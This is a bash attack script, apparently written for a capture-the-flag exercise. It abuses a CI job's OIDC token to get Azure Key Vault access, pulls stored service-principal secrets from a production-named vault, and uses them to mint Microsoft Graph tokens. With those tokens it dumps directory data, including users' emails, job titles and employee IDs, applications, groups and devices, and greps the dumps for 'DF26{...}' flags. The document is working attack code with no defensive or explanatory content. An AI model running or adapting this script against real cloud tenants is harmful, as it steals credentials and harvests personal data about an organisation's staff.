#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"
G="https://graph.microsoft.com/v1.0"
GB="https://graph.microsoft.com/beta"

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')

graph_tok () { # $1 principal-secret-name
  local J appId sec ten
  J=$(curl -sS $M -H "Authorization: Bearer $KV" "$PRODKV/secrets/$1?api-version=7.4" | jq -r '.value')
  appId=$(printf '%s' "$J" | jq -r '.appId // .clientId'); sec=$(printf '%s' "$J" | jq -r '.clientSecret // .password // .secret'); ten=$(printf '%s' "$J" | jq -r '.tenant // .tenantId // empty'); [ -z "$ten" ] && ten=$AZURE_TENANT_ID
  curl -sS $M -X POST "https://login.microsoftonline.com/$ten/oauth2/v2.0/token" -d "client_id=$appId" -d "client_secret=$sec" -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty'
}

DIR=/tmp/graph; mkdir -p "$DIR"
sweep () { # $1 label $2 token
  local label="$1" tok="$2"
  [ -z "$tok" ] && { echo "[$label] NO GRAPH TOKEN"; return; }
  # show app roles granted to this token
  local roles; roles=$(printf '%s' "$tok" | cut -d. -f2 | tr '_-' '/+' | { read p; r=$(( ${#p} % 4 )); [ $r -ne 0 ] && p="$p$(printf '%0.s=' $(seq 1 $((4-r))))"; printf '%s' "$p"; } | base64 -d 2>/dev/null | jq -r '.roles // [] | join(",")')
  echo "[$label] graph token OK; app roles: ${roles:-<none>}"
  declare -A Q=(
    [applications]="$G/applications?\$top=999&\$select=id,appId,displayName,notes,tags,identifierUris,info,description,web,signInAudience"
    [serviceprincipals]="$G/servicePrincipals?\$top=999&\$select=id,appId,displayName,notes,tags,description,info,servicePrincipalNames,replyUrls"
    [groups]="$G/groups?\$top=999&\$select=id,displayName,description,mailNickname"
    [users]="$G/users?\$top=999&\$select=id,displayName,userPrincipalName,mail,jobTitle,department,employeeId,otherMails,companyName"
    [org]="$G/organization"
    [adminunits]="$G/directory/administrativeUnits?\$top=999"
    [deletedapps]="$G/directory/deletedItems/microsoft.graph.application?\$top=999"
    [devices]="$G/devices?\$top=999&\$select=id,displayName"
    [b_apps_full]="$GB/applications?\$top=999"
    [b_sp_full]="$GB/servicePrincipals?\$top=200"
  )
  for k in "${!Q[@]}"; do
    local url="${Q[$k]}"
    local f="$DIR/${label}_$k.json"
    curl -sS $M -H "Authorization: Bearer $tok" "$url" -o "$f" 2>/dev/null
    local st; st=$(jq -r 'if .error then "ERR:"+.error.code else ("OK n="+((.value|length)//1|tostring)) end' "$f" 2>/dev/null)
    local hit; hit=$(grep -aoE "DF26\{[^}]*\}" "$f" 2>/dev/null | sort -u)
    echo "   $k: $st ${hit:+<<< FLAG: $hit}"
    [ -n "$hit" ] && { echo "   CONTEXT:"; grep -ao ".\{0,120\}DF26{[^}]*}.\{0,40\}" "$f" | head -3; }
  done
}

echo "=== directory-audit on Graph ==="
sweep "diraudit" "$(graph_tok directory-audit-principal)"
echo "=== secrets-sync on Graph ==="
sweep "secsync" "$(graph_tok secrets-sync-principal)"

echo "===== final grep across ALL graph dumps ====="
grep -raoE "DF26\{[^}]*\}" "$DIR" 2>/dev/null | sort -u || echo "(none)"
echo "GRAPH DONE"; exit 0
